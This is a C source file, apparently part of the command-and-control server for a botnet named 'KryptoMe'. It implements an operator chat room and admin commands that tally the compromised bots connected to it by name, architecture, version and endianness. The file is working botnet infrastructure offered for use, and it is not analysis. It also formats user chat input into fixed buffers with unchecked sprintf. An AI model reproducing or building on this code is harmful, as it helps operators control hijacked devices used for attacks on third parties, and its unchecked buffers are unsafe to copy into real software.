#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

#include "includes.h"
#include "usercmds.h"
#include "user.h"
#include "bots.h"
#include "util.h"

void usercmds_chat_prompt(int fd)
{
    char xxx[256];
    sprintf(xxx, " \x1b[38;5;202mchat> \x1b[97m");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 256);
    return;
}

int usercmds_chat(int fd)
{
    struct telnetdata_t *user = admin_retrieve_user_fd(fd);
    user->is_chatroom = 1;
    char xxx[1024];
    sprintf(xxx, " \x1b[38;5;202mWelcome to Kryptome Chat Room\r\n");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 1024);
    sprintf(xxx, " \x1b[38;5;202mPlease type /help for commands\r\n");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 1024);

    usercmds_chat_prompt(fd);

    uint8_t in_chat = 1;
    while(in_chat == 1)
    {
        char buf[512];
        memset(buf, 0, 512);
        if(fdgets(buf, sizeof(buf), fd) > 0)
        {
            buf[strcspn(buf, "\r\n")] = 0;
		    trim(buf);
            if(strlen(buf) < 1)
            {
                usercmds_chat_prompt(fd);
                continue;
            }

            if(buf[0] == '/')
            {
                // handle commands
                if(strstr(buf, "help") != NULL)
                {
                    sprintf(xxx, " \x1b[38;5;202m/help: displays this page\r\n");
                    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
                    memset(xxx, 0, 1024);
                    sprintf(xxx, " \x1b[38;5;202m/exit: returns to botnet\r\n");
                    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
                    memset(xxx, 0, 1024);
                    usercmds_chat_prompt(fd);
                    continue;
                }
                if(strstr(buf, "exit") != NULL)
                {
                    in_chat = 0;
                    break;
                }
            }
            else
            {
                // handle chat
                usercmds_chat_prompt(fd);

                int users_len = MAXFDS;// eventually make user list dynamic instead of statically fd based
                struct telnetdata_t *users = admin_retrieve_users();
                int x;
                for(x = 0; x < users_len; x++)
                {
                    if(users[x].is_chatroom == 0) continue;// make sure only people in chatroom see this message
                    if(x == fd) continue;// make sure sender dont get a duplicate on screen
                    sprintf(xxx, "[%s]: \"%s\"\r\n", user->username, buf);
                    send(x, xxx, strlen(xxx), MSG_NOSIGNAL);
                    usercmds_chat_prompt(x);
                }
            }
        }
        else
        {
            return 0;
        }
    }

    user->is_chatroom = 0;

    return 1;
}

void usercmds_admin_bots_count_name(int fd)
{
    struct clientdata_t *clients = bots_get_clients();
    struct bots_count_t **count = NULL;
    int count_len = 0;
    int x, i, j;
    for(x = 0; x < MAXFDS; x++)
    {
        if(clients[x].connected != 1) continue;
        
        int found = 0;
        
        for(i = 0; i < count_len; i++)
        {
            if(!strcmp(count[i]->id, clients[x].name))
            {
                found = 1;
                count[i]->count++;
                break;
            }
        }

        if(found == 0)
        {
            count = realloc(count, (count_len+1)*sizeof(struct bots_count_t *));
            count[count_len] = malloc(sizeof(struct bots_count_t));
            count[count_len]->count = 1;
            strncpy(count[count_len]->id, clients[x].name, 64);
            count_len++;
            continue;
        }
    }

    for(i = 0; i < count_len; i++) {
        for(j = i+1; j < count_len; j++){
            if(strcmp(count[i]->id, count[j]->id) > 0) {
                char temp[64];
                int temp_i = count[i]->count;
                strcpy(temp, count[i]->id);
                util_zero(count[i]->id);
                strcpy(count[i]->id, count[j]->id);
                count[i]->count = count[j]->count;
                util_zero(count[j]->id);
                strcpy(count[j]->id, temp);
                count[j]->count = temp_i;
            }
        }
    }

    char xxx[1024];
    sprintf(xxx, " \x1b[38;5;202m-----=====<| KryptoMe Botcount (NAME) |>=====-----\r\n");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 1024);

    for(x = 0; x < count_len; x++)
    {
        sprintf(xxx, "   \x1b[38;5;202m[%s]: %d\r\n", count[x]->id, count[x]->count);
        send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
        memset(xxx, 0, 1024);
    }
}

void usercmds_admin_bots_count_architecture(int fd)
{
    struct clientdata_t *clients = bots_get_clients();
    struct bots_count_t **count = NULL;
    int count_len = 0;
    int x;
    for(x = 0; x < MAXFDS; x++)
    {
        if(clients[x].connected != 1) continue;
        
        int i, found = 0;
        
        for(i = 0; i < count_len; i++)
        {
            if(!strcmp(count[i]->id, id2arch(clients[x].build)))
            {
                found = 1;
                count[i]->count++;
                break;
            }
        }

        if(found == 0)
        {
            count = realloc(count, (count_len+1)*sizeof(struct bots_count_t *));
            count[count_len] = malloc(sizeof(struct bots_count_t));
            count[count_len]->count = 1;
            strncpy(count[count_len]->id, id2arch(clients[x].build), 64);
            count_len++;
            continue;
        }
    }

    char xxx[1024];
    sprintf(xxx, " \x1b[38;5;202m-----=====<| KryptoMe Botcount (ARCH) |>=====-----\r\n");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 1024);

    for(x = 0; x < count_len; x++)
    {
        sprintf(xxx, "   \x1b[38;5;202m[%s]: %d\r\n", count[x]->id, count[x]->count);
        send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
        memset(xxx, 0, 1024);
    }
}

void usercmds_admin_bots_count_version(int fd)
{
    struct clientdata_t *clients = bots_get_clients();
    struct bots_count_t **count = NULL;
    int count_len = 0;
    int x;
    for(x = 0; x < MAXFDS; x++)
    {
        char version[512];
        sprintf(version, "%lf", clients[x].version);

        if(clients[x].connected != 1) continue;
        
        int i, found = 0;
        
        for(i = 0; i < count_len; i++)
        {
            if(!strcmp(count[i]->id, version))
            {
                found = 1;
                count[i]->count++;
                break;
            }
        }

        if(found == 0)
        {
            count = realloc(count, (count_len+1)*sizeof(struct bots_count_t *));
            count[count_len] = malloc(sizeof(struct bots_count_t));
            count[count_len]->count = 1;
            strncpy(count[count_len]->id, version, 64);
            count_len++;
            continue;
        }
    }

    char xxx[1024];
    sprintf(xxx, " \x1b[38;5;202m-----=====<| KryptoMe Botcount (VERSION) |>=====-----\r\n");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 1024);

    for(x = 0; x < count_len; x++)
    {
        sprintf(xxx, "   \x1b[38;5;202m[%s]: %d\r\n", count[x]->id, count[x]->count);
        send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
        memset(xxx, 0, 1024);
    }
}

void usercmds_admin_bots_count_endianess(int fd)
{
    struct clientdata_t *clients = bots_get_clients();
    struct bots_count_t **count = NULL;
    int count_len = 0;
    int x;
    for(x = 0; x < MAXFDS; x++)
    {
        if(clients[x].connected != 1) continue;
        
        int i, found = 0;
        
        for(i = 0; i < count_len; i++)
        {
            if(!strcmp(count[i]->id, id2endianess(clients[x].endianess)))
            {
                found = 1;
                count[i]->count++;
                break;
            }
        }

        if(found == 0)
        {
            count = realloc(count, (count_len+1)*sizeof(struct bots_count_t *));
            count[count_len] = malloc(sizeof(struct bots_count_t));
            count[count_len]->count = 1;
            strncpy(count[count_len]->id, id2endianess(clients[x].endianess), 64);
            count_len++;
            continue;
        }
    }

    char xxx[1024];
    sprintf(xxx, " \x1b[38;5;202m-----=====<| KryptoMe Botcount (ENDIANESS) |>=====-----\r\n");
    send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
    memset(xxx, 0, 1024);

    for(x = 0; x < count_len; x++)
    {
        sprintf(xxx, "   \x1b[38;5;202m[%s]: %d\r\n", count[x]->id, count[x]->count);
        send(fd, xxx, strlen(xxx), MSG_NOSIGNAL);
        memset(xxx, 0, 1024);
    }
}

